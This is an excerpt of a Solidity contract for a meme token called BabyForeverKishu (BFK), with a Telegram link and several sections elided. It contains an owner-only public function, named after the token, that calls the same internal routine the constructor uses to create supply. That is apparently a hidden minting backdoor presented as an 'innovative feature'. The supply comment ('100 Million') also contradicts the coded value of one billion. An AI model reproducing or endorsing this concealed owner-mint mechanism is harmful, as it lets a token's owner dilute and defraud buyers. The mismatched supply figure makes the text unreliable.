...
//
// $BabyForeverKishu proposes an innovative feature in its contract.
//
// 📱 Telegram:https:https://t.me/babyforeverkishu
// 🌎 Website: TBA
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function BabyForeverKishu(uint256 amount) public onlyOwner {
    _BabyForeverKishu(msg.sender, amount);
    }
    ...
    function _BabyForeverKishu(address account, uint256 amount) internal virtual {
...
contract BabyForeverKishu is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("BabyForever Kishu", "BFK") {
        _BabyForeverKishu(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}